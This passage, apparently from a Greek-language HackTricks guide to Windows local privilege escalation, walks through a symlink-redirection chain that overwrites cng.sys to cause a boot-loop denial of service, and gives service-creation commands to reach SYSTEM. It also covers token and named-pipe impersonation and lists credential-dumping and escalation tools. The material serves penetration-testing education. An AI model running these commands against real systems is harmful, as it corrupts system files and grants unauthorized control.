- Εντοπίζουν τον φάκελο, **δεν μπορούν να επιλύσουν τον πραγματικό driver** και **προκαλείται crash ή διακόπτεται η εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση** ούτε **ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιούχες διαδρομές αρχείων καταγραφής/αντιγράφων ασφαλείας + OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / boot DoS

Όταν μια **προνομιούχα υπηρεσία** γράφει αρχεία καταγραφής/εξαγωγές σε μια διαδρομή που διαβάζει από **εγγράψιμη ρύθμιση παραμέτρων**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η προνομιούχα εγγραφή να οδηγήσει σε αυθαίρετη αντικατάσταση αρχείων (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Προϋποθέσεις**
- Η ρύθμιση παραμέτρων που αποθηκεύει τη διαδρομή-στόχο είναι εγγράψιμη από τον επιτιθέμενο (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια προνομιούχα λειτουργία που γράφει σε αυτήν τη διαδρομή (αρχείο καταγραφής, εξαγωγή, αναφορά).

**Παράδειγμα αλυσίδας**
1. Διαβάστε τη ρύθμιση παραμέτρων για να εντοπίσετε τον προνομιούχο προορισμό του αρχείου καταγραφής, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς δικαιώματα διαχειριστή:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το log το προνομιούχο component (π.χ., ο admin επιλέγει «αποστολή δοκιμαστικού SMS»). Η εγγραφή αποθηκεύεται πλέον στο `C:\Windows\System32\cng.sys`.
4. Εξετάστε τον στόχο που αντικαταστάθηκε (με hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν το αλλοιωμένο driver path → **boot loop DoS**. Αυτό ισχύει γενικά και για οποιοδήποτε προστατευμένο αρχείο ανοίγει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` φορτώνεται συνήθως από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, ενδέχεται να επιχειρηθεί πρώτα η φόρτωσή του, καθιστώντας το αξιόπιστο DoS sink για αλλοιωμένα δεδομένα.



## **Από υψηλή ακεραιότητα σε SYSTEM**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη μια διεργασία υψηλής ακεραιότητας, η **μετάβαση σε SYSTEM** μπορεί να είναι εύκολη: αρκεί να **δημιουργήσετε και να εκτελέσετε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός δυαδικού αρχείου υπηρεσίας, βεβαιωθείτε ότι είναι έγκυρη υπηρεσία ή ότι εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις εγγραφές μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες για τα κλειδιά μητρώου που εμπλέκονται και για τον τρόπο εγκατάστασης ενός πακέτου _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### Από SeDebug + SeImpersonate σε Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια διεργασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από προστατευμένες διεργασίες) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτήν την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για την κλιμάκωση προνομίων στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση μιας υπηρεσίας για εγγραφή σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **προσποιηθεί το token** του client του pipe (της υπηρεσίας), αποκτώντας privileges SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για τα named pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από High Integrity σε System χρησιμοποιώντας named pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα permissions. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτόν τον τύπο κλιμάκωσης προνομίων και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια διεργασία High Integrity**, καθώς αυτή θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **Από Administrator ή Network Service σε System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Από LOCAL SERVICE ή NETWORK SERVICE σε full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση φορέων τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγχει για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίζεται.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγχει για πιθανές λανθασμένες ρυθμίσεις και συλλέγει πληροφορίες (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγχει για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών από τα PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίζεται.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Δοκιμάζει τα συλλεγμένα passwords σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο PowerShell για spoofing ADIDNS/LLMNR/mDNS και man-in-the-middle επιθέσεις.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική απαρίθμηση Windows για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζητά γνωστά vulnerabilities για privesc (DEPRECATED υπέρ του Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστά vulnerabilities για privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumerate τον host αναζητώντας λανθασμένες ρυθμίσεις (περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Ελέγχει για λανθασμένες ρυθμίσεις (precompiled executable στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγχει για πιθανές λανθασμένες ρυθμίσεις (exe από Python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτήν την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει exploits που λειτουργούν (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στον host-στόχο, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Θεμελιώδεις αρχές του Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Αύξηση προνομίων μέσω εκμετάλλευσης αδύναμων δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - συνοπτικός οδηγός](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop τοπικού Privilege Escalation σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις σε Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι Windows Privilege Escalation για Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing με μακροεντολή Word VBA μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Κυνηγώντας την Silver Fox: γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιούχου συστήματος αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμής συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ένας σύνδεσμος στο παρελθόν. Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (μεταφορά Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: επικίνδυνη επίλυση λειτουργικών μονάδων στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Μονάδες Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με Microslop: αλυσιδωτή εκμετάλλευση των CLDFLT και συνθηκών ανταγωνισμού του πυρήνα DirectX για Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τα κυβερνήσει όλα: πλήρες primitive εκμετάλλευσης ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για αύξηση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - κώδικας exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, μέρος 2: CVE-2020-1013, ένα Local Privilege Escalation 1-Day στα Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερεύνηση του Credential Manager και του Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: όταν μια αλλαγή εικόνας οδηγεί σε αύξηση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από το SSH Agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας τους εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας τους εταιρικούς διακομιστές ενημερώσεων σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Αύξηση προνομίων μέσω διαγραφής φακέλου του Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
